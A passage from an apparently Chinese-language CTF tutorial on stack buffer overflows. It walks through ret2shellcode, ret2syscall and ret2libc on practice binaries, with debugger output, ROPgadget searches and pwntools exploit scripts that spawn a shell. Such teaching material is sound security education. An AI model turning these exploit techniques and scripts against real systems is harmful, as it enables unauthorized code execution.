\n0\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ecd\u7136\u662f\u57fa\u672c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fd8\u540c\u65f6\u5c06\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u590d\u5236\u5230buf2\u5904\u3002\u7b80\u5355\u67e5\u770b\u53ef\u77e5buf2\u5728bss\u6bb5\u3002\n\n\n.bss:\n0804\nA080\n                 \npublic\n \nbuf2\n\n\n.bss:\n0804\nA080\n \n; char buf2[100]\n\n\n\n\n\n\u8fd9\u65f6\uff0c\u6211\u4eec\u7b80\u5355\u7684\u8c03\u8bd5\u4e0b\u7a0b\u5e8f\uff0c\u770b\u770b\u8fd9\u4e00\u4e2abss\u6bb5\u662f\u5426\u53ef\u6267\u884c\u3002\n\n\ngef\u27a4  b main\nBreakpoint \n1\n at 0x8048536: file ret2shellcode.c, line \n8\n.\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode \n\nBreakpoint \n1\n, main \n()\n at ret2shellcode.c:8\n\n8\n       setvbuf\n(\nstdout, 0LL, \n2\n, 0LL\n)\n;\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n source:ret2shellcode.c+8 \n]\n\u2500\u2500\u2500\u2500\n      \n6\n  int main\n(\nvoid\n)\n\n      \n7\n  \n{\n\n \u2192    \n8\n      setvbuf\n(\nstdout, 0LL, \n2\n, 0LL\n)\n;\n\n      \n9\n      setvbuf\n(\nstdin, 0LL, \n1\n, 0LL\n)\n;\n\n     \n10\n  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0x8048536 \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  vmmap \nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7faf000 0xf7fb2000 0x00000000 rwx \n0xf7fd3000 0xf7fd5000 0x00000000 rwx \n0xf7fd5000 0xf7fd7000 0x00000000 r-- \n[\nvvar\n]\n\n0xf7fd7000 0xf7fd9000 0x00000000 r-x \n[\nvdso\n]\n\n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rwx \n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx \n[\nstack\n]\n\n\n\n\n\n\u901a\u8fc7vmmap\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230bss\u6bb5\u5bf9\u5e94\u7684\u6bb5\u5177\u6709\u53ef\u6267\u884c\u6743\u9650\n\n\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n\n\n\n\n\u90a3\u4e48\u8fd9\u6b21\u6211\u4eec\u5c31\u63a7\u5236\u7a0b\u5e8f\u6267\u884cshellcode\uff0c\u4e5f\u5c31\u662f\u8bfb\u5165shellcode\uff0c\u7136\u540e\u63a7\u5236\u7a0b\u5e8f\u6267\u884cbss\u6bb5\u5904\u7684shellcode\u3002\u5176\u4e2d\uff0c\u76f8\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u7c7b\u4f3c\u4e8eret2text\u4e2d\u7684\u4f8b\u5b50\u3002\n\n\n\u5177\u4f53\u7684payload\u5982\u4e0b\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./ret2shellcode\n)\n\n\nshellcode\n \n=\n \nasm\n(\nshellcraft\n.\nsh\n())\n\n\nbuf2_addr\n \n=\n \n0x804a080\n\n\n\nsh\n.\nsendline\n(\nshellcode\n.\nljust\n(\n112\n,\n \nA\n)\n \n+\n \np32\n(\nbuf2_addr\n))\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\nsniperoj-pwn100-shellcode-x86-64\n\n\n\n\nret2syscall\n\n\n\u539f\u7406\n\n\nret2syscall\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u83b7\u53d6shell\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2d\u7684ret2syscall\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2syscall\n\n\n\u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4\n\n\n\u279c  ret2syscall checksec rop\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u63a5\u4e0b\u6765\u5229\u7528IDA\u6765\u67e5\u770b\u6e90\u7801\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\nstdin\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nThis time, no system() and NO SHELLCODE!!!\n);\n\n  \nputs\n(\nWhat do you plan to do?\n);\n\n  \ngets\n(\nv4\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6b64\u6b21\u4ecd\u7136\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u3002\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u7684\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97v4\u76f8\u5bf9\u4e8eebp\u7684\u504f\u79fb\u4e3a108\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8986\u76d6\u7684\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8ev4\u7684\u504f\u79fb\u4e3a112\u3002\u6b64\u6b21\uff0c\u7531\u4e8e\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u67d0\u4e00\u6bb5\u4ee3\u7801\u6216\u8005\u81ea\u5df1\u586b\u5199\u4ee3\u7801\u6765\u83b7\u5f97shell\uff0c\u6240\u4ee5\u6211\u4eec\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684gadgets\u6765\u83b7\u5f97shell\uff0c\u800c\u5bf9\u5e94\u7684shell\u83b7\u53d6\u5219\u662f\u5229\u7528\u7cfb\u7edf\u8c03\u7528\u3002\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u7684\u77e5\u8bc6\uff0c\u8bf7\u53c2\u8003\n\n\n\n\nhttps://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8\n\n\n\n\n\u7b80\u5355\u5730\u8bf4\uff0c\u53ea\u8981\u6211\u4eec\u628a\u5bf9\u5e94\u83b7\u53d6shell\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u653e\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6267\u884cint 0x80\u5c31\u53ef\u6267\u884c\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5982\u4e0b\u7cfb\u7edf\u8c03\u7528\u6765\u83b7\u53d6shell\n\n\nexecve\n(\n/bin/sh\n,\nNULL\n,\nNULL\n)\n\n\n\n\n\n\u5176\u4e2d\uff0c\u8be5\u7a0b\u5e8f\u662f32\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f7f\u5f97\n\n\n\n\n\u7cfb\u7edf\u8c03\u7528\u53f7\u5373eax\u5e94\u8be5\u4e3a0xb\n\n\n\u7b2c\u4e00\u4e2a\u53c2\u6570\u5373ebx\u5e94\u8be5\u6307\u5411/bin/sh\u7684\u5730\u5740\uff0c\u5176\u5b9e\u6267\u884csh\u7684\u5730\u5740\u4e5f\u53ef\u4ee5\n\n\n\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5373ecx\u5e94\u8be5\u4e3a0\n\n\n\u7b2c\u4e09\u4e2a\u53c2\u6570edx\u5e94\u8be5\u4e3a0\n\n\n\n\n\u800c\u6211\u4eec\u5982\u4f55\u63a7\u5236\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c \u5462\uff1f\u8fd9\u91cc\u5c31\u9700\u8981\u4f7f\u7528gadgets\u3002\u6bd4\u5982\u8bf4\uff0c\u73b0\u5728\u6808\u9876\u662f10\uff0c\u90a3\u4e48\u5982\u679c\u6b64\u65f6\u6267\u884c\u4e86pop eax\uff0c\u90a3\u4e48\u73b0\u5728eax\u7684\u503c\u5c31\u4e3a10\u3002\u4f46\u662f\u6211\u4eec\u5e76\u4e0d\u80fd\u671f\u5f85\u6709\u4e00\u6bb5\u8fde\u7eed\u7684\u4ee3\u7801\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u6bb5\u4e00\u6bb5\u63a7\u5236\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u5728gadgets\u6700\u540e\u4f7f\u7528ret\u6765\u518d\u6b21\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u7684\u539f\u56e0\u3002\u5177\u4f53\u5bfb\u627egadgets\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528ropgadgets\u8fd9\u4e2a\u5de5\u5177\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\u5bfb\u627e\u63a7\u5236eax\u7684gadgets\n\n\n\u279c  ret2syscall ROPgadget --binary rop  --only \npop|ret\n \n|\n grep \neax\n\n0x0809ddda : pop eax \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x080bb196 : pop eax \n;\n ret\n0x0807217a : pop eax \n;\n ret 0x80e\n0x0804f704 : pop eax \n;\n ret \n3\n\n0x0809ddd9 : pop es \n;\n pop eax \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u6709\u4e0a\u8ff0\u51e0\u4e2a\u90fd\u53ef\u4ee5\u63a7\u5236eax\uff0c\u90a3\u6211\u5c31\u9009\u53d6\u7b2c\u4e8c\u4e2a\u6765\u4f5c\u4e3a\u6211\u7684gadgets\u3002\n\n\n\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u63a7\u5236\u5176\u5b83\u5bc4\u5b58\u5668\u7684gadgets\n\n\n\u279c  ret2syscall ROPgadget --binary rop  --only \npop|ret\n \n|\n grep \nebx\n\n0x0809dde2 : pop ds \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x0809ddda : pop eax \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x0805b6ed : pop ebp \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x0809e1d4 : pop ebx \n;\n pop ebp \n;\n pop esi \n;\n pop edi \n;\n ret\n0x080be23f : pop ebx \n;\n pop edi \n;\n ret\n0x0806eb69 : pop ebx \n;\n pop edx \n;\n ret\n0x08092258 : pop ebx \n;\n pop esi \n;\n pop ebp \n;\n ret\n0x0804838b : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret\n0x080a9a42 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret 0x10\n0x08096a26 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret 0x14\n0x08070d73 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret 0xc\n0x0805ae81 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret \n4\n\n0x08049bfd : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret \n8\n\n0x08048913 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x08049a19 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret \n4\n\n0x08049a94 : pop ebx \n;\n pop esi \n;\n ret\n0x080481c9 : pop ebx \n;\n ret\n0x080d7d3c : pop ebx \n;\n ret 0x6f9\n0x08099c87 : pop ebx \n;\n ret \n8\n\n0x0806eb91 : pop ecx \n;\n pop ebx \n;\n ret\n0x0806336b : pop edi \n;\n pop esi \n;\n pop ebx \n;\n ret\n0x0806eb90 : pop edx \n;\n pop ecx \n;\n pop ebx \n;\n ret\n0x0809ddd9 : pop es \n;\n pop eax \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x0806eb68 : pop esi \n;\n pop ebx \n;\n pop edx \n;\n ret\n0x0805c820 : pop esi \n;\n pop ebx \n;\n ret\n0x08050256 : pop esp \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret\n0x0807b6ed : pop ss \n;\n pop ebx \n;\n ret\n\n\n\n\n\u8fd9\u91cc\uff0c\u6211\u9009\u62e9\n\n\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n\n\n\n\n\u8fd9\u4e2a\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u5176\u5b83\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002\n\n\n\u6b64\u5916\uff0c\u6211\u4eec\u9700\u8981\u83b7\u5f97/bin/sh\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002\n\n\n\u279c  ret2syscall ROPgadget --binary rop  --string \n/bin/sh\n \nStrings \ninformation\n\n\n============================================================\n\n0x080be408 : /bin/sh\n\n\n\n\n\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u6b64\u5916\uff0c\u8fd8\u6709int 0x80\u7684\u5730\u5740\uff0c\u5982\u4e0b\n\n\n\u279c  ret2syscall ROPgadget --binary rop  --only \nint\n                 \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080938fe : int 0xbb\n0x080869b5 : int 0xf6\n0x0807b4d4 : int 0xfc\n\nUnique gadgets found: 4\n\n\n\n\n\u540c\u65f6\uff0c\u4e5f\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\n\n\n\u4e0b\u9762\u5c31\u662f\u5bf9\u5e94\u7684payload,\u5176\u4e2d0xb\u4e3aexecve\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u3002\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./rop\n)\n\n\n\npop_eax_ret\n \n=\n \n0x080bb196\n\n\npop_edx_ecx_ebx_ret\n \n=\n \n0x0806eb90\n\n\nint_0x80\n \n=\n \n0x08049421\n\n\nbinsh\n \n=\n \n0x80be408\n\n\npayload\n \n=\n \nflat\n(\n\n    \n[\nA\n \n*\n \n112\n,\n \npop_eax_ret\n,\n \n0xb\n,\n \npop_edx_ecx_ebx_ret\n,\n \n0\n,\n \n0\n,\n \nbinsh\n,\n \nint_0x80\n])\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9898\u76ee\n\n\nret2libc\n\n\n\u539f\u7406\n\n\nret2libc\u5373\u63a7\u5236\u51fd\u6570\u7684\u6267\u884c libc\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u5e38\u662f\u8fd4\u56de\u81f3\u67d0\u4e2a\u51fd\u6570\u7684plt\u5904\u6216\u8005\u51fd\u6570\u7684\u5177\u4f53\u4f4d\u7f6e(\u5373\u51fd\u6570\u5bf9\u5e94\u7684got\u8868\u9879\u7684\u5185\u5bb9)\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u9009\u62e9\u6267\u884csystem(\"/bin/sh\")\uff0c\u6545\u800c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u77e5\u9053system\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\u4f8b\u5b50\n\n\n\u6211\u4eec\u7531\u7b80\u5355\u5230\u96be\u5206\u522b\u7ed9\u51fa\u4e09\u4e2a\u4f8b\u5b50\u3002\n\n\n\u4f8b1\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2dret2libc1\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2libc1\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\n\n\n\u279c  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u7a0b\u5e8f\u6e90\u4ee3\u7801\uff0c\u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\n_bss_start\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nRET2LIBC \n_\n);\n\n  \ngets\n((\nchar\n \n*\n)\nv4\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u5728\u6267\u884cgets\u51fd\u6570\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6808\u6ea2\u51fa\u3002\u6b64\u5916\uff0c\u5229\u7528ropgadget\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u662f\u5426\u6709/bin/sh\u5b58\u5728\n\n\n\u279c  ret2libc1 ROPgadget --binary ret2libc1 --string \n/bin/sh\n          \nStrings \ninformation\n\n\n============================================================\n\n0x08048720 : /bin/sh\n\n\n\n\n\u786e\u5b9e\u5b58\u5728\uff0c\u518d\u6b21\u67e5\u627e\u4e00\u4e0b\u662f\u5426\u6709system\u51fd\u6570\u5b58\u5728\u3002\u7ecf\u5728ida\u4e2d\u67e5\u627e\uff0c\u786e\u5b9e\u4e5f\u5b58\u5728\u3002\n\n\n.plt:\n08048460\n \n; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]\n\n\n\n\n\n\u90a3\u4e48\uff0c\u6211\u4eec\u76f4\u63a5\u8fd4\u56de\u8be5\u5904\uff0c\u5373\u6267\u884csystem\u51fd\u6570\u3002\u76f8\u5e94\u7684payload\u5982\u4e0b\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./ret2libc1\n)\n\n\n\nbinsh_addr\n \n=\n \n0x8048720\n\n\nsystem_plt\n \n=\n \n0x08048460\n\n\npayload\n \n=\n \nflat\n([\na\n \n*\n \n112\n,\n \nsystem_plt\n,\n \nb\n \n*\n \n4\n,\n \nbinsh_addr\n])\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6ce8\u610f\u51fd\u6570\u8c03\u7528\u6808\u7684\u7ed3\u6784\uff0c\u5982\u679c\u662f\u6b63\u5e38\u8c03\u7528system\u51fd\u6570\uff0c\u6211\u4eec\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u91cc\u4ee5'bbbb'\u4f5c\u4e3a\u865a\u5047\u7684\u5730\u5740\uff0c\u5176\u540e\u53c2\u6570\u5bf9\u5e94\u7684\u53c2\u6570\u5185\u5bb9\u3002\n\n\n\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u76f8\u5bf9\u6765\u8bf4\uff0c\u6700\u4e3a\u7b80\u5355\uff0c\u540c\u65f6\u63d0\u4f9b\u4e86system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\uff0c\u4f46\u662f\u5927\u591a\u6570\u7a0b\u5e8f\u5e76\u4e0d\u4f1a\u6709\u8fd9\u4e48\u597d\u7684\u60c5\u51b5\u3002\n\n\n\u4f8b2\n\n\n\u8fd9\u91cc\u4ee5bamboofox\u4e2d\u7684ret2libc2\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2libc2\n\n\n\u8be5\u9898\u76ee\u4e0e\u4f8b1\u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u518d\u51fa\u73b0/bin/sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6b64\u6b21\u9700\u8981\u6211\u4eec\u81ea\u5df1\u6765\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e24\u4e2agadgets\uff0c\u7b2c\u4e00\u4e2a\u63a7\u5236\u7a0b\u5e8f\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u63a7\u5236\u7a0b\u5e8f\u6267\u884csystem(\"\"/bin/sh\")\u3002\u7531\u4e8e\u6f0f\u6d1e\u4e0e\u4e0a\u8ff0\u4e00\u81f4\uff0c\u8fd9\u91cc\u5c31\u4e0d\u5728\u591a\u8bf4\uff0c\u5177\u4f53\u7684exp\u5982\u4e0b\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./ret2libc2\n)\n\n\n\ngets_plt\n \n=\n \n0x08048460\n\n\nsystem_plt\n \n=\n \n0x08048490\n\n\npop_ebx\n \n=\n \n0x0804843d\n\n\nbuf2\n \n=\n \n0x804a080\n\n\npayload\n \n=\n \nflat\n(\n\n    \n[\na\n \n*\n \n112\n,\n \ngets_plt\n,\n \npop_ebx\n,\n \nbuf2\n,\n \nsystem_plt\n,\n \n0xdeadbeef\n,\n \nbuf2\n])\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nsendline\n(\n/bin/sh\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u8fd9\u91cc\u5411\u7a0b\u5e8f\u4e2dbss\u6bb5\u7684buf2\u5904\u5199\u5165/bin/sh\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u5730\u5740\u4f5c\u4e3asystem\u7684\u53c2\u6570\u4f20\u5165\u3002\u8fd9\u6837\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u83b7\u5f97shell\u3002\n\n\n\u4f8b3\n\n\n\u8fd9\u91cc\u4ee5bamboofox\u4e2d\u7684ret2libc3\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2libc3\n\n\n\u5728\u4f8b2\u7684\u57fa\u7840\u4e0a\uff0c\u518d\u6b21\u5c06system\u51fd\u6570\u7684\u5730\u5740\u53bb\u6389\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u9700\u8981\u540c\u65f6\u627e\u5230system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u9996\u5148\uff0c\u67e5\u770b\u5b89\u5168\u4fdd\u62a4\n\n\n\u279c  ret2libc3 checksec ret2libc3\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4ecd\u65e7\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u8fdb\u800c\u67e5\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u7a0b\u5e8f\u7684bug\u4ecd\u7136\u662f\u6808\u6ea2\u51fa\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\nstdin\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nNo surprise anymore, system disappeard QQ.\n);\n\n  \nprintf\n(\nCan you find it !?\n);\n\n  \ngets\n((\nchar\n \n*\n)\nv4\n);\n\n  \nreturn\n 